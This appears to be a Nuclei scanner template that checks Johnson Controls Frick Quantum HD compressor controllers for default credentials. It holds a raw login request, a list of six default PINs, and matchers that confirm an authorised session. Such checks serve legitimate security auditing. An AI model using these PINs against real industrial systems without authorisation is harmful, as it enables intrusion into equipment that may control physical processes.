id: johnson-controls-frick-quantum-hd-compressor-default-login
info:
  name: Johnson Controls Frick Quantum HD Compressors Default Login
  author: mister-joe
  severity: high
  description: |
    Test for default credentials on Johnson Controls Frick Quantum HD Compressors.
  metadata:
    verified: true
    max-request: 4
    vendor: Johnson Controls
  tags: default-login

http:
  - raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        {"pin":"{{password}}"}

    attack: pitchfork
    payloads:
      password:
        - 1
        - 2
        - 3
        - 10
        - 20
        - 30

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        part: body
        regex:
          - "Authorized"
      - type: regex
        part: header
        regex:
          - "Set-Cookie:\\sPrimeUnity=.*;"
